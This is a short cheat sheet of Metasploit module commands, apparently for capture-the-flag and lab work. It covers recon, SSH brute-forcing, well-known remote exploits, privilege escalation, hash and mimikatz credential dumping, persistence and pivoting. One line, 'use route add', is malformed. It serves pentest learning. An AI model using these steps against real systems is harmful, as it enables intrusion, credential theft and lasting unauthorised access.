### 🔎 Recon

```bash
use auxiliary/scanner/portscan/tcp         # fast portscan
use auxiliary/scanner/http/http_version    # webserver fingerprint
use auxiliary/scanner/http/dir_scanner     # brute dirs
use auxiliary/scanner/smb/smb_version      # SMB fingerprint
use auxiliary/scanner/ssh/ssh_login        # brute SSH creds
```

---

### 💥 Remote Exploits (CTF favorites)

```bash
use exploit/windows/smb/ms08_067_netapi       # old but common in labs
use exploit/windows/smb/ms17_010_eternalblue # WannaCry vuln
use exploit/unix/ftp/vsftpd_234_backdoor     # backdoored FTP server
use exploit/multi/http/php_cgi_arg_injection # PHP CGI RCE
use exploit/multi/http/tomcat_mgr_upload     # deploy WAR shell
use exploit/multi/http/struts2_content_type_ognl # Struts2 RCE
```

---

### 🪓 PrivEsc (after foothold)

```bash
use post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/linux/local/dirty_cow
```

---

### 🔑 Looting / Creds

```bash
use post/windows/gather/hashdump            # dump SAM
use post/windows/gather/credentials/mimikatz # run mimikatz
use auxiliary/analyze/jtr_crack_fast        # crack dumped hashes
```

---

### 🎭 Post-Exploitation

```bash
use post/multi/manage/shell_to_meterpreter  # upgrade dumb shell
use post/windows/manage/migrate             # migrate to stable proc
use exploit/windows/local/persistence       # add persistence
```

---

### 🌐 Pivoting (if CTF has internal net)

```bash
use auxiliary/server/socks_proxy            # pivot via socks
use route add <subnet> <session>            # add pivot route
```

---

- Always start with `local_exploit_suggester` after getting a shell → it usually wins.
- Hashdump + mimikatz almost always give you the next step.